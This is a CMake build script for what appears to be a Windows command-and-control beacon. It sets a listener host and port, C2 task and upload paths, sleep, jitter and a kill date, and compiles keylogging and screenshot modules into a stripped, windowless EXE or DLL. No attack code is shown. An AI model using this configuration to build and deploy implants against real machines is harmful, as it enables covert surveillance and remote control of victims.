cmake_minimum_required(VERSION 3.22)
project(${PAYLOAD_NAME}.${PAYLOAD_ARCH})

# COMPILER
if(${PAYLOAD_ARCH} STREQUAL "amd64")
    set(CMAKE_CXX_COMPILER x86_64-w64-mingw32-g++)
elseif(${PAYLOAD_ARCH} STREQUAL "i686")
    set(CMAKE_CXX_COMPILER i686-w64-mingw32-g++)
endif()

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# FLAGS
set(CMAKE_CXX_FLAGS "-municode -Os -s \
    -fno-asynchronous-unwind-tables -falign-jumps=1 -falign-labels=1 \
    -ffunction-sections -fdata-sections -fno-exceptions -fPIC \
    -static-libgcc \
    -Wl,-subsystem,windows,-s,--no-seh,--enable-stdcall-fixup,--gc-sections,-Bstatic"
)

# INCLUDE
include_directories(include)

# DEFINE
if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
    add_compile_definitions(PAYLOAD_SLEEP=${PAYLOAD_SLEEP})
    add_compile_definitions(PAYLOAD_JITTER=${PAYLOAD_JITTER})
    add_compile_definitions(PAYLOAD_KILLDATE=${PAYLOAD_KILLDATE})
endif()
add_compile_definitions(PAYLOAD_TYPE=${PAYLOAD_TYPE})
add_compile_definitions(LISTENER_PROTOCOL=${LISTENER_PROTOCOL})
add_compile_definitions(LISTENER_HOST=${LISTENER_HOST})
add_compile_definitions(LISTENER_PORT=${LISTENER_PORT})
add_compile_definitions(REQUEST_PATH_DOWNLOAD=${REQUEST_PATH_DOWNLOAD})
add_compile_definitions(REQUEST_PATH_CHECKIN=${REQUEST_PATH_CHECKIN})
add_compile_definitions(REQUEST_PATH_TASKGET=${REQUEST_PATH_TASKGET})
add_compile_definitions(REQUEST_PATH_TASKRESULT=${REQUEST_PATH_TASKRESULT})
add_compile_definitions(REQUEST_PATH_UPLOAD=${REQUEST_PATH_UPLOAD})
add_compile_definitions(REQUEST_PATH_WEBSOCKET=${REQUEST_PATH_WEBSOCKET})

# SOURCE
if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
    set(SOURCE
            src/main/beacon_${PAYLOAD_FORMAT}.cpp
            src/core/hermit.cpp
            src/core/common.cpp
            src/core/convert.cpp
            src/core/fs.cpp
            src/core/ip.cpp
            src/core/keylog.cpp
            src/core/net.cpp
            src/core/screenshot.cpp
            src/core/task.cpp
            src/core/utils.cpp
            src/core/winhttp.cpp
            src/core/winsystem.cpp
    )
# elseif(${PAYLOAD_TYPE} STREQUAL \"interactive\")
endif()

# LINK LIBRATILIES
# link_libraries(netapi32 wtsapi32 mscoree mscorlib)
link_libraries(dbghelp gdi32 gdiplus iphlpapi psapi shlwapi winhttp wsock32 ws2_32)

# ADD
if(${PAYLOAD_FORMAT} STREQUAL "dll")
    add_library(${PROJECT_NAME} SHARED ${SOURCE})
    set_target_properties(${PROJECT_NAME}
        PROPERTIES
            LIBRARY_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
            PREFIX ""
            SUFFIX ".dll"
    )
    add_definitions(-DIS_DLL)
elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
    add_executable(${PROJECT_NAME} WIN32 ${SOURCE})
    set_target_properties(${PROJECT_NAME}
        PROPERTIES
            RUNTIME_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
            PREFIX ""
            SUFFIX ".exe"
    )
endif()
